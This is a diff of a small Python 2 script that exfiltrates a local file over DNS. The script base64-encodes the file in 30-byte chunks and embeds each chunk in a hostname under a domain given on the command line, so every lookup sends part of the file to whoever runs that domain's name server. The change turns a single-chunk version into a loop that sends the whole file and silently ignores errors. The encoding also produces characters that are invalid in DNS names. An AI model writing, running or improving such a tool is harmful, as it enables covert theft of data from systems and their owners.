@@ -1,12 +1,13 @@
 #!/usr/bin/python
 
 from socket import gethostbyname
-from base64 import urlsafe_b64encode
+from base64 import standard_b64encode
 from sys import argv
+from time import sleep
 
 local_filename = argv[1]
 remote_filename = argv[2]
-base_url = argv[3]
+base_domain = argv[3]
 
 # Why are chunks so small?
 # From RFC 1035, these are the size limits for DNS:
@@ -15,16 +16,16 @@ base_url = argv[3]
 #    TTL             positive values of a signed 32 bit number.
 #    UDP messages    512 octets or less
 #
-# We are using the name to transfer data.
-# Subtract 5 for the length bytes
-# Subtract bytes for file name
-# Subtract the length for the base URL
-# Divide the remainder by 2 to allow for base64 shananigans (not exact)
+# Bad math: about label-size/2 to allow for base64 padding.
 
-
-chunk_size = (255 - 5 - len(remote_filename) - len(base_url)) / 2
-
-with open(local_filename) as f:
-    data = f.read(chunk_size)
-    url = '.'.join([urlsafe_b64encode(data), remote_filename, base_url])
-    gethostbyname(url)
+chunk_size = 30
+with open(local_filename, 'rb') as f:
+    while True:
+        data = f.read(chunk_size)
+        if not data: break
+        domain = '.'.join([standard_b64encode(data), remote_filename, base_domain])
+        print domain
+        try:
+            gethostbyname(domain)
+        except:
+            pass
